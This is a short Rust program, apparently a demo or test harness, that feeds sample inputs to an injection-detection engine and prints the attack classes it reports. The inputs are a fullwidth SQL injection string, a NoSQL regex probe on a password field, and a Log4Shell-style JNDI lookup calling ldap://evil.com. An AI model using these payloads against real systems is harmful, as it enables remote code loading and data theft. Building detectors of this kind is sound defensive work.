use invariant_engine::engine::InvariantEngine;
fn main() {
    let engine = InvariantEngine::new();
    println!("SQL fullwidth: {:?}", engine.detect_deep("ＯＲ 1=1--", None).matches.iter().map(|m| m.class).collect::<Vec<_>>());
    println!("NoSQL: {:?}", engine.detect_deep("{\"\": \"this.password.match(/^a/)\"}", None).matches.iter().map(|m| m.class).collect::<Vec<_>>());
    println!("Log4Shell: {:?}", engine.detect_deep("${\\ndi:ldap://evil.com/a}", None).matches.iter().map(|m| m.class).collect::<Vec<_>>());
}
